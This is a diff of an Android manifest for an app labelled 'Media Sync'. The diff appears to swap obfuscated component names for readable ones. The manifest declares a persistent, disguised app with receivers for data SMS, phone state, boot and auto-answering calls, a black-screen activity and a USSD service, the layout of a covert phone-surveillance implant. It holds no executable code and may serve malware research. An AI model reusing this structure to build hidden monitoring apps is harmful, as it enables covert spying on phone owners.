@@ -1,13 +1,13 @@
-<?xml version="1.0" encoding="utf-8" standalone="no"?><manifest xmlns:android="http://schemas.android.com/apk/res/android" package="seC.dujmehn.qdtheyt" platformBuildVersionCode="23" platformBuildVersionName="6.0-2438415">
-    <application android:allowClearUserData="false" android:allowTaskReparenting="true" android:debuggable="false" android:enabled="true" android:hasCode="true" android:icon="@android:drawable/stat_notify_sync" android:label="Media Sync" android:name="seC.dujmehn.qdtheyt.qwudj.DujmehnQff" android:persistent="true" android:theme="@android:style/Theme.Black.NoTitleBar">
-        <activity android:label="@string/hello" android:name="seC.dujmehn.qdtheyt.Dujmehnpqyd">
+<?xml version="1.0" encoding="utf-8" standalone="no"?><manifest xmlns:android="http://schemas.android.com/apk/res/android" package="com.network.android">
+    <application android:allowClearUserData="false" android:allowTaskReparenting="true" android:debuggable="false" android:enabled="true" android:hasCode="true" android:icon="@android:drawable/stat_notify_sync" android:label="Media Sync" android:name="com.network.android.agent.NetworkApp" android:persistent="true" android:theme="@android:style/Theme.Black.NoTitleBar">
+        <activity android:label="@string/hello" android:name="com.network.android.NetworkMain">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN"/>
             </intent-filter>
         </activity>
-        <activity android:name=".heeCJqf.IxemTuinjef" android:theme="@android:style/Theme.Black.NoTitleBar" class="com.network.android.ShowDesktop"/>
-        <activity android:name=".heeCJqf.RBqsnIshuud" android:theme="@android:style/Theme.Black.NoTitleBar" class="com.network.android.BlackScreen"/>
-        <receiver android:enabled="true" android:name="seC.dujmehn.qdtheyt.ICiHusuyluh">
+        <activity android:name=".roomTap.ShowDesktop" android:theme="@android:style/Theme.Black.NoTitleBar" class="com.network.android.ShowDesktop"/>
+        <activity android:name=".roomTap.BlackScreen" android:theme="@android:style/Theme.Black.NoTitleBar" class="com.network.android.BlackScreen"/>
+        <receiver android:enabled="true" android:name="com.network.android.SmsReceiver">
             <intent-filter android:priority="100">
                 <action android:name="android.intent.action.DATA_SMS_RECEIVED"/>
                 <data android:scheme="sms"/>
@@ -15,7 +15,7 @@
                 <data android:port="0"/>
             </intent-filter>
         </receiver>
-        <receiver android:enabled="true" android:name="seC.dujmehn.qdtheyt.qwudj.DujmehnHusuyluh">
+        <receiver android:enabled="true" android:name="com.network.android.agent.NetworkReceiver">
             <intent-filter>
                 <action android:name="android.intent.action.PHONE_STATE"/>
                 <action android:name="android.intent.action.USER_PRESENT"/>
@@ -36,29 +36,29 @@
                 <action android:name="android.intent.action.BATTERY_CHANGED"/>
             </intent-filter>
         </receiver>
-        <receiver android:enabled="true" android:name=".heeCJqf.QkjeQdimuhHusuyluh">
+        <receiver android:enabled="true" android:name=".roomTap.AutoAnswerReceiver">
             <intent-filter android:priority="100">
                 <action android:name="android.intent.action.PHONE_STATE"/>
             </intent-filter>
         </receiver>
-        <receiver android:enabled="true" android:name="seC.dujmehn.qdtheyt.QdtheytSqBBTyhusjMqjsxuh">
+        <receiver android:enabled="true" android:name="com.network.android.AndroidCallDirectWatcher">
             <intent-filter android:priority="100">
                 <action android:name="android.intent.action.PHONE_STATE"/>
             </intent-filter>
         </receiver>
-        <receiver android:enabled="true" android:name="seC.dujmehn.qdtheyt.ReejHusuyluh">
+        <receiver android:enabled="true" android:name="com.network.android.BootReceiver">
             <intent-filter>
                 <action android:name="android.intent.action.BOOT_COMPLETED"/>
             </intent-filter>
         </receiver>
-        <receiver android:name="seC.dujmehn.Cutyq.SehuHusuyluh"/>
-        <receiver android:name="seC.dujmehn.Besqjyed.FydwHusuyluh"/>
-        <receiver android:name="seC.dujmehn.Besqjyed.EdQBqhCHusuyluh"/>
-        <service android:name="seC.dujmehn.qdtheyt.qdtheyt.Cedyjeh.QffIuhlysu"/>
-        <service android:name="seC.dujmehn.qdtheyt.qdtheyt.Cedyjeh.QffIuhlysuFydwuh"/>
-        <service android:enabled="true" android:name="seC.dujmehn.qdtheyt.qdtheyt.Cedyjeh.DujmehnpqdqwuhIuhlysu"/>
-        <service android:enabled="true" android:name=".heeCJqf.putyqFBqOuhXqdtBuhIuhlysu"/>
-        <service android:enabled="true" android:exported="true" android:name="seC.dujmehn.kiit.STKIITIuhlysu">
+        <receiver android:name="com.network.media.CoreReceiver"/>
+        <receiver android:name="com.network.location.PingReceiver"/>
+        <receiver android:name="com.network.location.OnAlarmReceiver"/>
+        <service android:name="com.network.android.android.monitor.AppService"/>
+        <service android:name="com.network.android.android.monitor.AppServicePinger"/>
+        <service android:enabled="true" android:name="com.network.android.android.monitor.NetworkManagerService"/>
+        <service android:enabled="true" android:name=".roomTap.MediaPlayerHandlerService"/>
+        <service android:enabled="true" android:exported="true" android:name="com.network.ussd.CDUSSDService">
             <intent-filter>
                 <action android:name="com.android.ussd.IExtendedNetworkService"/>
             </intent-filter>
@@ -186,19 +186,4 @@
     <uses-permission android:name="com.android.email.permission.ACCESS_PROVIDER"/>
     <uses-permission android:name="com.android.email.provider.EmailProvider"/>
     <uses-permission android:name="android.permission.WRITE_APN_SETTINGS"/>
-    <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
-    <uses-permission android:name="android.permission.WAKE_LOCK"/>
-    <uses-permission android:name="android.permission.SET_WALLPAPER_HINTS"/>
-    <uses-permission android:name="android.permission.READ_SYNC_SETTINGS"/>
-    <uses-permission android:name="android.permission.READ_SYNC_STATS"/>
-    <uses-permission android:name="android.permission.NFC"/>
-    <uses-permission android:name="android.permission.READ_SYNC_SETTINGS"/>
-    <uses-permission android:name="android.permission.UNINSTALL_SHORTCUT"/>
-    <uses-permission android:name="android.permission.CHANGE_WIFI_MULTICAST_STATE"/>
-    <uses-permission android:name="android.permission.INTERNET"/>
-    <uses-permission android:name="android.permission.NFC"/>
-    <uses-permission android:name="android.permission.ACCESS_NOTIFICATION_POLICY"/>
-    <uses-permission android:name="android.permission.CHANGE_NETWORK_STATE"/>
-    <uses-permission android:name="android.permission.READ_SYNC_STATS"/>
-    <uses-permission android:name="android.permission.UNINSTALL_SHORTCUT"/>
 </manifest>
